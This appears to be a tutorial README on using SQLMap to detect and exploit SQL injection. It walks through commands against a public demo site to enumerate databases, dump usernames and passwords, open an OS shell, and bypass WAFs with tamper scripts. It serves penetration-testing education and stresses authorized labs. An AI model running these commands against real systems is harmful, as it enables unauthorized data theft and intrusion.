
<img width="807" height="417" alt="exploiting-sqli-with-sqlmap" src="https://github.com/user-attachments/assets/bdd4d043-2ade-40d4-b162-425e269c1ae5" />

SQLMap is an **open-source automated tool** that helps penetration testers detect and exploit **SQL injection (SQLi) vulnerabilities**. It supports multiple databases (MySQL, MSSQL, PostgreSQL, Oracle, SQLite) and can automatically enumerate databases, tables, columns, and dump data.

---

## **1. Installation**

SQLMap works on **Linux, Windows, and macOS**. You have three main options:

### **Option 1: Git Clone (Recommended)**

1. Open your terminal.
2. Clone SQLMap repository:

```bash
git clone https://github.com/sqlmapproject/sqlmap.git
```

3. Navigate to the cloned folder:

```bash
cd sqlmap
```

4. Run SQLMap help to check installation:

```bash
python3 sqlmap.py --help
```

**Explanation:** Displays all available commands and options.

---

### **Option 2: Download ZIP**

1. Go to: [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)
2. Download the ZIP and extract it to a folder.
3. Open terminal or command prompt, navigate to the folder:

```bash
cd path/to/sqlmap
```

4. Run SQLMap:

```bash
python3 sqlmap.py --help
```

---

### **Option 3: Install via Linux Package Manager**

* On Ubuntu/Debian:

```bash
sudo apt update
sudo apt install sqlmap
```

* Verify installation:

```bash
sqlmap --version
```

**Tip:** Using Git clone ensures you have the **latest version**.

---

## **2. Understanding SQLMap Basics**

SQLMap automates tasks that would otherwise require manual SQL injection testing:

* Detect vulnerable parameters (URL, forms, cookies)
* Identify database type (MySQL, MSSQL, etc.)
* Enumerate databases, tables, columns
* Dump sensitive data (usernames, passwords)
* Gain shell access (if database is misconfigured)

**Important:** Always practice on **authorized labs** like **DVWA**, **Mutillidae**, or **bWAPP**.

---

## **3. Basic Usage**

### **Step 1: Test a URL for SQL Injection**

**Example vulnerable URL:**

```
http://testphp.vulnweb.com/listproducts.php?cat=1
```

**Command:**

```bash
python3 sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1"
```

**Explanation:**

* `-u` → Specifies the target URL
* SQLMap will try to detect SQLi automatically (Error-Based, Union-Based, Boolean-Based, Time-Based).

**Example Output:**

```
[INFO] testing 'GET parameter 'cat''
[INFO] GET parameter 'cat' appears to be injectable
[INFO] the back-end DBMS is MySQL
```

---

### **Step 2: Enumerate Databases**

**Command:**

```bash
python3 sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
```

**Explanation:**

* `--dbs` → Lists all databases on the target server

**Example Output:**

```
Database: information_schema
Database: acuart
Database: mysql
```

---

### **Step 3: Enumerate Tables in a Database**

**Command:**

```bash
python3 sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
```

**Explanation:**

* `-D acuart` → Selects the target database
* `--tables` → Lists all tables in that database

**Example Output:**

```
+-----------------+
| users           |
| products        |
| orders          |
+-----------------+
```

---

### **Step 4: Enumerate Columns in a Table**

**Command:**

```bash
python3 sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns
```

**Explanation:**

* `-T users` → Target table
* `--columns` → List all columns of the table

**Example Output:**

```
+----------+-------------+
| id       | int         |
| username | varchar(50) |
| password | varchar(50) |
+----------+-------------+
```

---

### **Step 5: Dump Data from a Table**

**Command:**

```bash
python3 sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C username,password --dump
```

**Explanation:**

* `-C` → Select columns to extract
* `--dump` → Extracts and displays data

**Example Output:**

```
+----------+----------+
| username | password |
+----------+----------+
| admin    | 12345    |
| test     | test123  |
+----------+----------+
```

---

## **4. Using SQLMap with POST Data**

If the application uses POST requests (like login forms):

**Example:**

```
POST http://example.com/login.php
username=admin&password=test
```

**Command:**

```bash
python3 sqlmap.py -u "http://example.com/login.php" --data="username=admin&password=test"
```

**Explanation:**

* `--data` → Specifies POST parameters

---

## **5. Using Cookies with SQLMap**

If the application requires cookies (like session cookies):

**Command:**

```bash
python3 sqlmap.py -u "http://example.com/list.php?id=1" --cookie="PHPSESSID=12345"
```

**Explanation:**

* SQLMap uses the cookie to authenticate requests before testing SQLi

---

## **6. Advanced Options**

* **Specify Database Type:**

```bash
--dbms=mysql
```

* **Verbose Output:**

```bash
-v 3
```

* **OS Shell Access (if vulnerable):**

```bash
--os-shell
```

* **Level & Risk Options:**

```bash
--level=1 --risk=1
```

* Level 1 → Basic tests (safe)

* Risk 1 → Low-risk payloads

* **Tamper Scripts:** Bypass WAFs or filters:

```bash
--tamper=space2comment
```

---

## **7. Best Practices**

1. **Always test one payload at a time**.
2. Use **Error-Based SQLi first** to understand database structure.
3. Union-Based SQLi is faster for **directly extracting data**.
4. SQLMap can detect: Error-Based, Union-Based, Boolean-Based, and Time-Based SQLi automatically.
5. Practice only on **authorized labs** (DVWA, Mutillidae, bWAPP).
6. Combine SQLMap with **manual testing** to understand how SQLi works and for learning.

---
